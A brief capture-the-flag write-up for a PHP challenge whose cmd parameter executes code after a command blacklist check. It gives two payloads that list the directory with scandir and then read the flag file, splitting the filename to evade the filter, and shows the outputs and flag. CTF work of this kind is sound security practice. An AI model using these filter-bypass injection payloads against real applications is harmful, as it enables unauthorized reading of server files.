# PHPFilters 1

So in this ctf we can inject payloads via the `cmd` GET param.
Then it is check with a filter of a big list of commands and if it passes it gets executed.

So we have to look at the posible php fuctions to use since almost all of the linux commands are banned.

payload 1:
```php
?cmd=var_dump(scandir(%22.%22)); # var_dump(scandir("."));
```
output:
```
array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(15) "flagzzzzzzz.txt" [3]=> string(9) "index.php" } 
```
payload 2:
```php
?cmd=print_r(file_get_contents(%22fla%22.%22gzzzzzzz.txt%22)); # print_r(file_get_contents("fla"."gzzzzzzz.txt"))
```
output (in inspect page source code):
```
<?php
$flag="T43CTF{blaklists_are_not_so_effective}";
?>
```


flag: `T43CTF{blaklists_are_not_so_effective}`